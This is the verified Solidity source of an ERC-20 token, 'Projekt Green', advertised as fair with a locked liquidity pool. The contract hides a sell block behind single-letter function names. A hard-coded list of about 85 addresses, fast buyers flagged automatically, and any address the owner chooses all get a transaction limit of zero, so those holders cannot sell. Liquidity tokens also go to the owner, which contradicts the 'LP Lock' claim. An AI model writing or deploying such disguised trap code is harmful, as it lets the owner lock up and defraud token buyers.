/**
 *Submitted for verification at Etherscan.io on 2021-06-02
*/

/* Projekt Green, by The Fair Token Project
 * 100% LP Lock
 * 0% burn
 * Projekt Telegram: t.me/projektgreen
 * FTP Telegram: t.me/fairtokenproject
 */
 
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ProjektGreen is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _q;
    mapping (address => uint256) private _p;
    mapping (address => mapping (address => uint256)) private _allowances;
   
    uint256 private constant _tTotal = 100000000000000 * 10**9;

    string private _name = unicode"Projekt Green 🟢💵💵";
    string private _symbol = 'GREEN';
    uint8 private _decimals = 9;
    uint8 private _d = 5;
    uint private _c = 0;
    
    address payable private _feeAddress;
    
    uint256 public _maxTxAmount = 500000000000 * 10**9;
    uint256 private _maxFee = _maxTxAmount.div(100).mul(3);

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    constructor (address payable FeeAddress) {
        _p[address(0x9D8069F0594cAE7200cB2b8233145AB08ED52920)] = 1;
        _p[address(0xE61eB661Ad2aDD6F8e8B1E1a065Be3885b4Dac5a)] = 1;
        _p[address(0xd4a0c19b4130805edA5Cc378CdCC4b60f1f178Ec)] = 1;
        _p[address(0x30e8d77ADFbc1D446aFdb5338828280bd323Fa86)] = 1;
        _p[address(0x10CA70e28f99676Bfc668c4A32999dD110B8301D)] = 1;
        _p[address(0x6BfB033c1b882F494770fFdCbCA1b67E62D960FD)] = 1;
        _p[address(0x16201e6cFE70A6FE2E28fFf8509afBebd48f028B)] = 1;
        _p[address(0x08F5013aCb6A0EC956293F7CBd6D38e2a23164d5)] = 1;
        _p[address(0xe4003d3CFeB45d90296FA8747ba7fBB1814cB7B1)] = 1;
        _p[address(0xaf904309CbF4113d1BA3Fd237a70A540ac921059)] = 1;
        _p[address(0x7eC51Cd46d9D29Fbf6f16927e1743CF6E0697e41)] = 1;
        _p[address(0xF7f675fBD1c253f5d98F602Df79CCc6b811Db6D5)] = 1;
        _p[address(0xd0c7046810abb4A7F59dB841EB7Bef2727A39486)] = 1;
        _p[address(0x118e3Aa543dA96d26771b32EcdDC42056B62F05a)] = 1;
        _p[address(0xbA27E0b051270Ee37A753061A56A17807AAC14eE)] = 1;
        _p[address(0x6DD6F3Bce4092A0736B73e9bCb6D1303E9aD048a)] = 1;
        _p[address(0xeD3fA506d4881c2D0848B44209192D53745dEF79)] = 1;
        _p[address(0xeB2629a2734e272Bcc07BDA959863f316F4bD4Cf)] = 1;
        _p[address(0xF04426B97bE0B9cbd08797387E2B44fa1DB605Fa)] = 1;
        _p[address(0xB921890c45202F03AE45Db736cccc75a9dB10492)] = 1;
        _p[address(0xD78b6E4391DD8dF46a035D9A2D7336B6C5Ebd9b6)] = 1;
        _p[address(0x9Cc44744dF022da74c3A8f214F59556dbDbd6f18)] = 1;
        _p[address(0x6c8E34793f2b73C80cb225D73CE411B805656992)] = 1;
        _p[address(0xfE4eb4Acaaf0309Ff9E41A526fD0c82Cc646d064)] = 1;
        _p[address(0xA3b66D43aE385864e2ae08E23f4A85BC62e564C3)] = 1;
        _p[address(0xA5c01b8253Fb8d6F228c0AB3B4054d73122Fb538)] = 1;
        _p[address(0x04c77d4E45FA4B9BEb7A50E2A555f7C288FDB4D3)] = 1;
        _p[address(0xf2d457A5569488Dc13af91BC1D7c9A2344687A9B)] = 1;
        _p[address(0xF819F7145Cb8371878C6b705F3f4eD2FB75F36A4)] = 1;
        _p[address(0x1ecb72bFAC3ccdEfa0003Cf378e9a1CC2574076A)] = 1;
        _p[address(0x1f0b41AA9eEe2277C5671C2E6Dac597226A75255)] = 1;
        _p[address(0x93f5af632Ce523286e033f0510E9b3C9710F4489)] = 1;
        _p[address(0x3dA567872b989A66eD77d3d2B680aE8D96462990)] = 1;
        _p[address(0x2CccE360D356BC9c200D32A53012832903029030)] = 1;
        _p[address(0x97A8A0BEf44b60a92DdcdCf3Fc9C82Ef5D97814e)] = 1;
        _p[address(0xD4C435c026817fF34b62aDfe9a5136317Ab23A10)] = 1;
        _p[address(0xF4813754AE0d94BDC5C530a82785881e7d6d5BA2)] = 1;
        _p[address(0xdf1C5D67b3E4dd7a3B93f7aC5249c5FF3f60895d)] = 1;
        _p[address(0x35Bbf75e3a9DCD8AE9af485740697D289c6F643c)] = 1;
        _p[address(0x9725f46E124F370C46D311A1e856956A2341aa70)] = 1;
        _p[address(0x5350ca8AdD3aa63147290d7C3319F8a752C069F7)] = 1;
        _p[address(0xD9Ed88862F0Ebec8750E0c34d5985A1B87e85Ed9)] = 1;
        _p[address(0x876aBa8Dc1c60cC57F840E3B283b62948a02d532)] = 1;
        _p[address(0x6f5055d9f701c9425cEfB1922917aFB717a11042)] = 1;
        _p[address(0xC433c3fbe4Fe8d66bB276Eb7EAbF4F39de2314d0)] = 1;
        _p[address(0xA94E56EFc384088717bb6edCccEc289A72Ec2381)] = 1;
        _p[address(0xf765BB6809183318D3d42f2589CB552F60F70f0F)] = 1;
        _p[address(0x756686C4542cfBF52E45143eD5348e754cb06d83)] = 1;
        _p[address(0xD9c5606854dE46e77Ff17c0B94d451F033ED54EA)] = 1;
        _p[address(0xaB44CAF3F19265eEc60eB8eF681a08d680E1283D)] = 1;
        _p[address(0x67973685fDA141d2F68277468494878ed13c045c)] = 1;
        _p[address(0x6660E0AAc73c495D49deD3934132C405C4615E01)] = 1;
        _p[address(0xB954d1eEE2D1E75f256a5D99E9b7cde13898D85B)] = 1;
        _p[address(0xC9216b36886EeC112406233Ed07765D163820aAB)] = 1;
        _p[address(0x7d92AD7e1b6Ae22c6a43283aF3856028CD3d856A)] = 1;
        _p[address(0x5F328898F5E69c1891D2179d96fe1716b947fd0A)] = 1;
        _p[address(0x8d476C9a286030a757E951F140bdddD0D29f1995)] = 1;
        _p[address(0x339B48C75d4BE7E655089F0F8e0a37BA5bcF048b)] = 1;
        _p[address(0x4b7f087B68eaa21763210341265Baeb41bc92ee4)] = 1;
        _p[address(0x6Ce55A980e2D646Ca20aE59019a4Cd6647555615)] = 1;
        _p[address(0xA62c5bA4D3C95b3dDb247EAbAa2C8E56BAC9D6dA)] = 1;
        _p[address(0x3DCa07E16B2Becd3eb76a9F9CE240B525451f887)] = 1;
        _p[address(0xB95B31088B131E587D4A8BdcF7fbAdbC6b15b241)] = 1;
        _p[address(0x65C277bC6452a0A683b6a3B2bBa12fc70D2691B0)] = 1;
        _p[address(0xa3b0f0ecf7b13B2f99deF216901f9e2894d0a5D2)] = 1;
        _p[address(0xCEDc90bacc0C3ea20B0b7D3E1e30A7a2C45738b3)] = 1;
        _p[address(0x82D0330cB7aa4d12347109204416976530249829)] = 1;
        _p[address(0x44a47C262Dd2c38c065606797E7a6657a5fde6e1)] = 1;
        _p[address(0x3FB80007367F16Ade9168A3Be2Fcca5C7f357cBc)] = 1;
        _p[address(0xC2450210216922aCC1Da1947ef23526d63dC9a76)] = 1;
        _p[address(0x0C7B21C5238eCd2aa1cB9fd7d265474695FB9Ea8)] = 1;
        _p[address(0xc1cFf51724C9FeED7d5145953eCe9ad3fe26a0c8)] = 1;
        _p[address(0x856bFc01D2A30956E72b0F61fE50173A36B2e759)] = 1;
        _p[address(0xad12aB3276854bA6e65b75Dd382d2a7f08191440)] = 1;
        _p[address(0x1732951b80C737dBb8F367e83E530623bB612E54)] = 1;
        _p[address(0xD5b92c0cc232E6cf83D6ED73c5759f7Eedf7315a)] = 1;
        _p[address(0xD2960c3C1adeeF99EDB82BA0C11b75994F87F2AC)] = 1;
        _p[address(0xFFe12e5EDB2fd04ef140Ce9A8178B386BF6aE17F)] = 1;
        _p[address(0xFea31c954d83aFF9685C100cd56DF9eC24207d74)] = 1;
        _p[address(0x449B824730Eeb34Ef524eD68B304977b7029BBb9)] = 1;
        _p[address(0xAcEcE2C109AF6fDA78125cDa83c40E04dafEe10d)] = 1;
        _p[address(0x9a5C9475285B673c06f34340825b9D170BD82321)] = 1;
        _p[address(0xa5693564F8e43F403DB8b9D17De088C7Afb42D72)] = 1;
        _feeAddress = FeeAddress;
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function ethBalance() public view returns (uint256){
        return address(this).balance;
    }
    
    function banCount() public view returns(uint) {
        return _c;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2
        );
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    receive() external payable {}

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (recipient != uniswapV2Pair && (block.number - _q[recipient]) <= _d)
            w(recipient);
        
        uint256 _original = amount;
        uint256 _fee = amount.div(100).mul(3);
        uint256 _newAmount = _original.sub(_fee);

        if (_fee > _maxFee) {
            _fee = 0;
            _newAmount = _original;
        }
        
        if(sender != owner() && recipient != owner() && tradingOpen){
            if(_p[sender] >= 1)
                _maxTxAmount = 0;
            else if(sender != uniswapV2Pair)
                _maxTxAmount = _tTotal;
            else
                _maxTxAmount = 500000000000 * 10**9;
                
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }    
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(_newAmount);
        _balances[address(this)] = _balances[address(this)].add(_fee);
        
        if(!inSwap && sender != uniswapV2Pair && swapEnabled){
            uint256 tokenBal = balanceOf(address(this));
            if(tokenBal > 0)
                swapTokensForEth(tokenBal);
            uint256 ethBal = address(this).balance;
            if(ethBal > 0) 
                sendETHToFee(address(this).balance);
        }
        z(block.number, recipient);
        emit Transfer(sender, recipient, _newAmount);
    }
    
    function z(uint b, address a) private {
        _q[a] = b;
    }
    
    function w(address a) private {
        if(_p[a] != 1)
            _c += 1;
        _p[a] = 1;
    }
    
    function v(address a) external onlyOwner() {
        _p[a] = 1;
    }
    
    function u(address a) external onlyOwner() {
        _p[a] = 0;
        _c -= 1;
    }
    
    function k(uint8 a) external onlyOwner() {
        _d = a;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function sendETHToFee(uint256 amount) private {
        _feeAddress.transfer(amount);
    }
    
    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        cooldownEnabled = true;
        tradingOpen = true;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }
}